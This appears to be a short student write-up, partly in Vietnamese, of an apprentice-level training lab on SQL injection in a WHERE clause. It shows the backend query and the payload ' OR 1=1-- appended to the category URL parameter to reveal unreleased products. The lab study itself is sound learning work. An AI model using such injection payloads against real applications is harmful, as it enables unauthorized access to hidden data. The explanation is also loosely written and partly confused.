# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- **Mức độ:** Apprentice
- **Chủ đề:** SQL Injection
- **Mục tiêu:** Khai thác lỗi SQLi trong filter để hiển thị products chưa phát hành (`released = 1` thành luôn đúng).

## 1. Phân tích lỗ hổng
- Truy vấn gốc của ứng dụng tại backend:  
SQL SYNTAX:```
  ```
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1
  ```

Test case direct URL :
use quote charactor ' to query Database website 
From:
add ' OR 1=1--  in URL
TO:
SELECT * FROM products WHERE category = 'Gifts'+OR+1=1--' AND released = 1

truy xuất và tìm được các products có released =1 , là lấy tất cả sản phẩm kể cả sản phẩm chưa được thêm vào category specify